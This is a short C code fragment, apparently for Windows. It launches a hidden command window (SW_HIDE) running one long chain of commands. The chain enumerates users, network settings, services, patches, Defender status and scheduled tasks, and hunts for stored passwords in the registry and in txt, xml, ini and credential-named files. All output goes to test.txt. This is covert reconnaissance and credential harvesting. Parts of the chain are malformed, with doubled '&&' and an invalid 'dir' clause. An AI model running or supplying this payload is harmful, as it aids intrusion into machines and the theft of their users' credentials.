...
int main()
{
    ...
    sei.lpParameters = "/k ipconfig /allcompartments /all > test.txt && net user >> test.txt && whoami >> test.txt && hostname >> test.txt && wmic nicconfig get description,IPAddress,MACaddress >> test.txt && route PRINT >> test.txt && arp -a >> test.txt && netstat -ano >> test.txt && sc query windefend >> test.txt && tasklist /SVC >> test.txt && set userdomain >> test.txt && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" >> test.txt && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" /v LastUsedUsername >> test.txt && reg query HKLM /f password /t REG_SZ /s >> test.txt && reg query HKCU /f password /t REG_SZ /s >> test.txt && wmic qfe >> test.txt && wmic product get name, version, vendor >> test.txt && wmic qfe get Caption, Description, HotFixID, InstalledOn >> test.txt && wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\" >> test.txt && wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\" |findstr /i /v \"\"\" >> test.txt && net start >> test.txt && Driverquery >> test.txt && Schtasks /query /fo LIST /v >> test.txt && echo MARKER && findstr /si password *.txt >> test.txt && && findstr /si password *.xml >> test.txt && && findstr /si password *.ini >> test.txt && dir /s *pass* == *cred* == *vnc* == *.config* >> test.txt && echo DONE && exit";
    sei.nShow = SW_HIDE;
